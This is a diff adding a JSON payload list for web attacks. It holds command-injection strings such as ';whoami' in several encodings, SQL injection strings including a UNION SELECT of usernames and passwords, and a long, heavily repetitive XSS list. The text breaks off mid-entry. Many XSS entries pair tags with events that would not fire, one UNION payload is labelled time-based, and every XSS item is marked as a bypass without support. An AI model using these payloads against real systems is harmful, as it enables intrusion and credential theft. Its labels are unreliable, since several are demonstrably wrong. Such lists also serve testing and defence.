@@ -1,0 +1,5039 @@
+{
+  "cmd": [
+    {
+      "os": "linux",
+      "command": "whoami",
+      "operator": ";",
+      "original": ";whoami",
+      "base64": "O3dob2FtaQ==",
+      "url_encoded": "%3Bwhoami",
+      "hex_encoded": "\\x3B\\x77\\x68\\x6F\\x61\\x6D\\x69",
+      "unicode_escaped": "\\u003B\\u0077\\u0068\\u006F\\u0061\\u006D\\u0069",
+      "obfuscated": ";whoami"
+    },
+    {
+      "os": "linux",
+      "command": "whoami",
+      "operator": "\u0026\u0026",
+      "original": "\u0026\u0026whoami",
+      "base64": "JiZ3aG9hbWk=",
+      "url_encoded": "%26%26whoami",
+      "hex_encoded": "\\x26\\x26\\x77\\x68\\x6F\\x61\\x6D\\x69",
+      "unicode_escaped": "\\u0026\\u0026\\u0077\\u0068\\u006F\\u0061\\u006D\\u0069",
+      "obfuscated": "\u0026%26whoami"
+    },
+    {
+      "os": "linux",
+      "command": "whoami",
+      "operator": "|",
+      "original": "|whoami",
+      "base64": "fHdob2FtaQ==",
+      "url_encoded": "%7Cwhoami",
+      "hex_encoded": "\\x7C\\x77\\x68\\x6F\\x61\\x6D\\x69",
+      "unicode_escaped": "\\u007C\\u0077\\u0068\\u006F\\u0061\\u006D\\u0069",
+      "obfuscated": "|whoami"
+    }
+  ],
+  "sqli": [
+    {
+      "type": "Error-based",
+      "payload": "' OR 1=1--",
+      "bypass": false,
+      "encoded": "%27+OR+1%3D1--"
+    },
+    {
+      "type": "Union-based",
+      "payload": "' UNION SELECT null, username, password FROM users--",
+      "bypass": true,
+      "encoded": "%27+UNION+SELECT+null%2C+username%2C+password+FROM+users--"
+    },
+    {
+      "type": "Blind SQLi",
+      "payload": "' AND SLEEP(5)--",
+      "bypass": true,
+      "encoded": "%27+AND+SLEEP%285%29--"
+    },
+    {
+      "type": "Error-based",
+      "payload": "' OR 'a'='a",
+      "bypass": false,
+      "encoded": "%27+OR+%27a%27%3D%27a"
+    },
+    {
+      "type": "Time-based",
+      "payload": "' AND 1=1 UNION SELECT null, version()--",
+      "bypass": true,
+      "encoded": "%27+AND+1%3D1+UNION+SELECT+null%2C+version%28%29--"
+    },
+    {
+      "type": "Union-based",
+      "payload": "' AND 1=1 UNION SELECT null, database(), user()--",
+      "bypass": true,
+      "encoded": "%27+AND+1%3D1+UNION+SELECT+null%2C+database%28%29%2C+user%28%29--"
+    },
+    {
+      "type": "Union-based",
+      "payload": "' OR 1=1/*",
+      "bypass": false,
+      "encoded": "%27+OR+1%3D1%2F%2A"
+    },
+    {
+      "type": "Error-based",
+      "payload": "' OR 1=1#",
+      "bypass": false,
+      "encoded": "%27+OR+1%3D1%23"
+    }
+  ],
+  "xss": [
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=alert(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dalert%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(1)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(1)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(1)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%281%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(1)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%281%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(1)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=confirm(1)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dconfirm%281%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(1)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%281%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=confirm(1)\u003e",
